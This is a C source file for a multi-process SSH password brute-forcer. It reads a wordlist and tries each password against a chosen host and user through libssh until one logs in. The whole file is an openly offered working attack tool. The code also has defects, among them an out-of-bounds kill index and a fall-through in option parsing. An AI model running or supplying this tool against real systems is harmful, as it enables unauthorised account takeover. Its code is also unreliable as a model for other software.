/*

 SSH Brute-force in C !
 C0d3r: MMxM
 Blog: hc0der.blogspot.com
 Twitter: @hc0d3r

 Compiling:

$ gcc brute_ssh.c -o ssh_brute -lssh

 Executing:

$ ./ssh_brute -x localhost -u root -w wordlist.txt -t 20


Note: you need libssh to compile it
# apt-get install libssh-dev

_( R </3 )_

*/

#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/mman.h>
#define LIBSSH_STATIC 1
#include <libssh/libssh.h>
#include <string.h>
#include <getopt.h>
#include <signal.h>

static int *cracked;

char *USER = NULL;
char *HOST = NULL;


int ssh_brute(const char *passwd_s){
	if(*cracked == 1) exit(0);
	printf("[*] Testing [%s: %s]\n",USER,passwd_s);
	ssh_session ssh_id;
	ssh_id = ssh_new();
	int check;
	ssh_options_set(ssh_id,SSH_OPTIONS_HOST, HOST);
	ssh_options_set(ssh_id,SSH_OPTIONS_USER, USER);

	if((check = ssh_connect(ssh_id)) != SSH_OK){
		ssh_free(ssh_id);
		return(-1);
	}

	if((check = ssh_userauth_password(ssh_id, NULL,passwd_s)) != SSH_AUTH_SUCCESS){
		ssh_free(ssh_id);
		return(-1);
	}

	ssh_disconnect(ssh_id);
	ssh_free(ssh_id);
	*cracked = 1;
	printf("\n\n\tCracked --> [%s : %s]\n\n",USER,passwd_s);
	return(0);
}

void help_x (void){
	fprintf(stderr,"\n[+] SSH Crack by MMxM\n\n");
	fprintf(stderr," Options:\n\n");
	fprintf(stderr,"\t-x <target_host>\n");
	fprintf(stderr,"\t-u <user>\n");
	fprintf(stderr,"\t-w <wordlist_file>\n");
	fprintf(stderr,"\t-t <Threads_number> default: 10\n\n");
	exit(1);
}

int brute_ssh_main(int argc,char **argv){
	cracked = mmap(NULL, sizeof *cracked, PROT_READ | PROT_WRITE,
		MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*cracked = 0;


	int THREADS = 10, check_h = 0,
	j = 0, i = 0, opts;

	char *file_name = NULL;

	while((opts = getopt (argc, argv, "x:u:t:w:h")) != -1){
		switch(opts){
			case 'h':
				check_h = 1;
				break;
			case 'x':
				HOST = optarg;
				break;
			case 'w':
				file_name = optarg;
				break;
			case 'u':
				USER = optarg;
				break;
			case 't':
				THREADS = atoi(optarg);
			case '?':
				if(optopt == 'w')
					fprintf(stderr, "Option -w requires an argument.\n");
				else if(optopt == 'x')
					fprintf(stderr, "Option -x requires an argument.\n");
				else if(optopt == 'u')
					fprintf(stderr, "Option -u requires an argument.\n");
				else if(optopt == 't')
					fprintf(stderr, "Option -t requires an argument.\n");
				else if(optopt == 0)
					break;
				else
					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
				return 1;
			default:
				abort();
		}
	}

	if(check_h == 1) help_x();

	if(HOST == NULL || file_name == NULL || USER == NULL){
		fprintf(stderr,"ssh-brute: try 'ssh_brute -h' for more information\n");
		return(1);
	}

	pid_t pids[THREADS];

	for(i=0;i<THREADS;i++){
		pids[i] = 0;
	}

	pid_t tmp;

	FILE *wordlist;

	char C;

	wordlist = fopen(file_name,"r");
	if(wordlist == NULL){
		fprintf(stderr,"Error to read file: %s\n",strerror(errno));
		return(1);
	}

	int line = 0,maxsize = 0,t = 0;

	while( (C = fgetc(wordlist)) != EOF ){
		if(C=='\n'){
			if(t>maxsize)
				maxsize = t;
			t = 0;
			line++;
		}
		t++;
	}

	char Password[maxsize];

	fseek(wordlist,0,SEEK_SET);
	int pos = 0;

	printf("\n[+] Starting Attack\n");
	printf("[*] Host: %s\n",HOST);
	printf("[*] User: %s\n",USER);
	printf("[*] Wordlist: %s\n\n",file_name);

	while( (C = fgetc(wordlist)) != EOF ){

		if(C=='\n'){
			Password[pos] = '\0';
			pos = 0;

			tmp = fork();

			if(tmp){
				pids[j] = tmp;
			} else if(tmp == 0){
				ssh_brute(Password);
				exit(0);
			} else {
				fprintf(stderr,"\n\t[-] Fork Failed!\n\n");
			}
			j++;

			if(j==THREADS){
				for(i=0;i<THREADS;i++){
					waitpid(pids[i],NULL,0);
				}

				for(i=0;i<THREADS;i++){
					pids[i] = 0;
				}
				j = 0;

			}

		} else {
			Password[pos] = C;
			pos++;
		}

		if(*cracked == 1){
			for(i=0;i<THREADS;i++){
				if(pids[i] == 0) continue;
				kill(pids[THREADS],SIGTERM);
			}
			break;
		}


	}

	fclose(wordlist);

	for(i=0;i<THREADS;i++){
		waitpid(pids[i],NULL,0);
	}

	printf("\n[+] 100%% complete =)\n\n");
	return(0);
}
